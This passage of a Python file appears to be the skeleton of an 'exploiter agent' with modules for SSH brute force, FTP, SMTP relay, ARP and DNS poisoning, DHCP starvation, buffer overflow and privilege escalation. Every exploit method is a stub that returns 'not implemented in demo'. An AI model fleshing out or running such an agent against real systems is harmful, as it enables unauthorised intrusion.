                return await self._ssh_brute_force(target, parameters)
            elif service == "ftp":
                return await self._ftp_anonymous_exploit(target, parameters)
            elif service == "smtp":
                return await self._smtp_relay_exploit(target, parameters)
            else:
                return {"error": f"Unknown service: {service}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    async def _ssh_brute_force(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute SSH brute force"""
        return {"success": False, "details": "SSH brute force not implemented in demo"}
    
    async def _ftp_anonymous_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute FTP anonymous exploit"""
        return {"success": False, "details": "FTP anonymous exploit not implemented in demo"}
    
    async def _smtp_relay_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute SMTP relay exploit"""
        return {"success": False, "details": "SMTP relay exploit not implemented in demo"}

class NetworkExploitModule:
    """Network exploitation module"""
    
    def __init__(self, agent):
        self.agent = agent
    
    async def execute_exploit(self, target: str, exploit_name: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute network exploit"""
        try:
            if exploit_name == "arp_poisoning":
                return await self._arp_poisoning_exploit(target, parameters)
            elif exploit_name == "dns_poisoning":
                return await self._dns_poisoning_exploit(target, parameters)
            elif exploit_name == "dhcp_starvation":
                return await self._dhcp_starvation_exploit(target, parameters)
            else:
                return {"error": f"Unknown network exploit: {exploit_name}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    async def _arp_poisoning_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute ARP poisoning exploit"""
        return {"success": False, "details": "ARP poisoning exploit not implemented in demo"}
    
    async def _dns_poisoning_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute DNS poisoning exploit"""
        return {"success": False, "details": "DNS poisoning exploit not implemented in demo"}
    
    async def _dhcp_starvation_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute DHCP starvation exploit"""
        return {"success": False, "details": "DHCP starvation exploit not implemented in demo"}

class SystemExploitModule:
    """System exploitation module"""
    
    def __init__(self, agent):
        self.agent = agent
    
    async def execute_exploit(self, target: str, exploit_name: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute system exploit"""
        try:
            if exploit_name == "buffer_overflow":
                return await self._buffer_overflow_exploit(target, parameters)
            elif exploit_name == "privilege_escalation":
                return await self._privilege_escalation_exploit(target, parameters)
            else:
                return {"error": f"Unknown system exploit: {exploit_name}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    async def _buffer_overflow_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute buffer overflow exploit"""
        return {"success": False, "details": "Buffer overflow exploit not implemented in demo"}
    
    async def _privilege_escalation_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute privilege escalation exploit"""
        return {"success": False, "details": "Privilege escalation exploit not implemented in demo"}

def main():
    """Main function for running exploiter agent"""
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python exploiter_agent.py <agent_id>")
        sys.exit(1)
    
    agent_id = sys.argv[1]
    agent = ExploiterAgent(agent_id)
    
    async def run_agent():
        try:
            await agent.initialize()
            
            # Keep agent running
            while agent.running:
                await asyncio.sleep(1)
                
        except KeyboardInterrupt:
            logger.info("Exploiter agent shutting down...")
        except Exception as e:
            logger.error(f"Agent error: {e}")
        finally:
            await agent.shutdown()
    
    asyncio.run(run_agent())

if __name__ == "__main__":
    main()